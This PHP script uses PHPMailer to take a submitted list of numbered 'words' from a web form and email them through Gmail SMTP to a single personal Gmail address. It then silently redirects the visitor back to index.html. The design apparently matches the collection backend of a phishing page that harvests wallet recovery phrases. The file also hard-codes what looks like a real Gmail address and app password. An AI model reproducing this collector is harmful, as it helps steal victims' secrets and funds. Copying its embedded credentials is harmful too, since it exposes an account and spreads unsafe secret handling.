<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Include PHPMailer files (adjust the path if needed)
require 'vendor/autoload.php'; // If using Composer
// or manually:
// require 'PHPMailer/src/Exception.php';
// require 'PHPMailer/src/PHPMailer.php';
// require 'PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $words = $_POST['wordinput'];

    // Combine words into message body
    $body = "<h2>Submitted Words</h2><ul>";
    foreach ($words as $index => $word) {
        $body .= "<li><strong>Word #" . ($index + 1) . ":</strong> " . htmlspecialchars($word) . "</li>";
    }
    $body .= "</ul>";

    // Setup PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';         // 🔁 Replace with your SMTP server
        $mail->SMTPAuth   = true;
        $mail->Username   = 'harryjonson616@gmail.com';           // 🔁 Replace with your email
        $mail->Password   = 'hron taer rhsc zefv';      // 🔁 Replace with your password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; // Or use PHPMailer::ENCRYPTION_SMTPS
        $mail->Port       = 587;                        // Usually 587 for TLS, or 465 for SSL

        // Recipients
        $mail->setFrom('harryjonson616@gmail.com', 'Word Form');
        $mail->addAddress('harryjonson616@gmail.com');      // 🔁 Replace with recipient email

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'Submitted Words from Form';
        $mail->Body    = $body;

        $mail->send();
        echo "Message has been sent!";
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}

header("Location: index.html"); // Redirect back to the form page
exit();
?>
